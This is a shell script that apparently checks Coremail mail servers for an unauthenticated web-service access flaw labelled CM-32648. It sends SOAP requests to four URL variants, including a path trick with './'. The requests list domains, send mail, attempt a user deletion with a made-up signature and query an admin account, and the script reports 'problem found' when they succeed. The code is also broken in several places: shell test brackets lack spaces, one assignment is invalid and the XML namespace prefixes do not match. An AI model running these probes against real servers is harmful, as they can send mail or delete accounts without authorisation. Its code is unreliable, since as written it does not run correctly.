#!/bin/sh
HOST=$1
BASE_URL_1="http://$HOST/apiws/services/"
BASE_URL_2="http://$HOST/./apiws/services/"
BASE_URL_3="https://$HOST/apiws/services/"
BASE_URL_4="https://$HOST/./apiws/services/"
URL_CODE_1=""
URL_CODE_2=""
URL_CODE_3=""
URL_CODE_4=""

function check_base_url()
{
	URL=$1
	curl $URL > /dev/null 2>&1
	if [ $? -ne 0]; then
		echo "0"
	else
		echo "1"
	fi
}

function check_api_cmd()
{
	API_CMD=$1
	API_BODY=$2
	BASE_URL =$3
	URL_CODE=$4
	if [ "${URL_CODE}" == "0" ]; then
		echo "----Checking cmd:  ${API_CMD} ..."
		echo "host reject"
	else
		echo "----Checking cmd:  ${API_CMD} ..."
		curl -L -s -S -w '%{http_code}' -o ${API_CMD}.body -H 'Content-Type: text/xml' $BASE_URL/${API_CMD} -d "${API_BODY}" |grep -q =200
		if [$? -eq 0]; then
			grep -i 'soap:Envelope' ${API_CMD}.body | grep -i -v -q -E '>-1</return>|>-l</code>|Access Denied'
			if [ $? -eq 0]; then
				echo "problem found!!!"
				return 1
			fi
		fi
		echo "Safe"
		return 0
	fi
}

CMD1="API"
BODY1="
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:nsl=\"http://coremail.cn/apiws\">
	<soapenv:Body>
		<nsl:getDomainList />
	</soapenv:Body>
</soapenv:Envelope>
"

CMD2="SendmailAPI"
BODY2="
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
	<soap:Body>
		<ns1:sendmail2OneOrMore  xmlns:nsl=\"http://coremail.cn/sendmailws\">
			<mail_subject>Q00tMzI2NDgg5ryP5rSeIHBvYw==</mail_subject>
			<mail_from>poc-test-CM-32648@localhost.local</mail_from>
			<mail_to>test@local</mail_to>
			<mail_text>bm8gY29udGVudAo=<!></mail_text>
			<text_encoding>UTF-8</text_encoding>
		</nsl:sendmail2OneOrMore>
	</soap:Body>
</soap:Envelope>
"

CMD3="SyncAPI"
BODY3="
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
	<soap:Body>
		<deleteUser xmlns=\"http://coremail.cn/syncws\">
			<servicecode>xxx</servicecode>
			<time>20000101000000</time>
			<sign>ab6da9e0852fe83fc7e0f1c299ec02dc</sign>
			<loginname>INVALID-USER@local</loginname>
			<orgcoding></orgcoding>
			<datatype>xml</datatype>
			<describe></describe>
		</deleteUser>
	</soap:Body>
</soap:Envelope>
"

CMD4="UserService"
BODY4="
<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
	<soap:Body>
		<nsl:queryTheUser xmlns:nsl=\"http://coremail.cn/apiws\">
			<loginName>admin@dev292.com</loginName>
		</nsl:queryTheUser>
	</soap:Body>
</soap:Envelope>
"

URL_CODE_1=$(check_base_url ${BASE_URL_1})
echo "url: ${BASE_URL_1}"
check_api_cmd "${CMD1}" "${BODY1}" ${BASE_URL_1} ${URL_CODE_1}
check_api_cmd "${CMD2}" "${BODY2}" ${BASE_URL_1} ${URL_CODE_1}
check_api_cmd "${CMD3}" "${BODY3}" ${BASE_URL_1} ${URL_CODE_1}
check_api_cmd "${CMD4}" "${BODY4}" ${BASE_URL_1} ${URL_CODE_1}

URL_CODE_2=$(check_base_url ${BASE_URL_2})
echo "url: ${BASE_URL_2}"
check_api_cmd "${CMD1}" "${BODY1}" ${BASE_URL_2} ${URL_CODE_2}
check_api_cmd "${CMD2}" "${BODY2}" ${BASE_URL_2} ${URL_CODE_2}
check_api_cmd "${CMD3}" "${BODY3}" ${BASE_URL_2} ${URL_CODE_2}
check_api_cmd "${CMD4}" "${BODY4}" ${BASE_URL_2} ${URL_CODE_2}

URL_CODE_3=$(check_base_url ${BASE_URL_3})
echo "url: ${BASE_URL_3}"
check_api_cmd "${CMD1}" "${BODY1}" ${BASE_URL_3} ${URL_CODE_3}
check_api_cmd "${CMD2}" "${BODY2}" ${BASE_URL_3} ${URL_CODE_3}
check_api_cmd "${CMD3}" "${BODY3}" ${BASE_URL_3} ${URL_CODE_3}
check_api_cmd "${CMD4}" "${BODY4}" ${BASE_URL_3} ${URL_CODE_3}

URL_CODE_4=$(check_base_url ${BASE_URL_4})
echo "url: ${BASE_URL_4}"
check_api_cmd "${CMD1}" "${BODY1}" ${BASE_URL_4} ${URL_CODE_4}
check_api_cmd "${CMD2}" "${BODY2}" ${BASE_URL_4} ${URL_CODE_4}
check_api_cmd "${CMD3}" "${BODY3}" ${BASE_URL_4} ${URL_CODE_4}
check_api_cmd "${CMD4}" "${BODY4}" ${BASE_URL_4} ${URL_CODE_4}